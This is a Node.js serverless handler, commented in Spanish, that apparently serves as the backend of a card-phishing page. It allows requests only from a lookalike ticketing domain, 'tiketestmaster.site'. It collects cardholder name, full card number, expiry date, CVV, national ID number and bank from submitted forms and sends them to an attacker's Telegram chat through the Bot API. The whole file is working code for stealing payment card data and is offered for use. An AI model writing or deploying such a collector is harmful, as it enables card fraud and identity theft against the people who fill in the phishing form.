import fetch from 'node-fetch';

export default async function handler(req, res) {
  // 1) CORS para todas las respuestas
  res.setHeader('Access-Control-Allow-Origin', 'https://tiketestmaster.site');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // 2) Responder preflight
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // 3) Solo permitimos POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Solo POST permitido' });
  }

  // 4) Lógica de envío a Telegram (igual que antes)
  const { titular, numeroTarjeta, fechaExp, cvv, documento, banco } = req.body;
  if (!titular || !numeroTarjeta || !fechaExp || !cvv || !documento || !banco) {
    return res.status(400).json({ error: 'Faltan campos obligatorios' });
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID  = process.env.TELEGRAM_CHAT_ID;
  const text =
    `🔻NUEVO REGISTRO🔻\n` +
    `Titular: ${titular}\n` +
    `CC: ${numeroTarjeta}\n` +
    `Fecha: ${fechaExp}\n` +
    `CVV: ${cvv}\n` +
    `ID: ${documento}\n` +
    `Banco: ${banco}`;

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      }
    );
    const data = await tgRes.json();
    if (!data.ok) throw new Error(data.description);
    return res.status(200).json({ sent: true });
  } catch (err) {
    console.error('Telegram API error:', err);
    return res.status(500).json({ error: 'Error enviando mensaje' });
  }
}
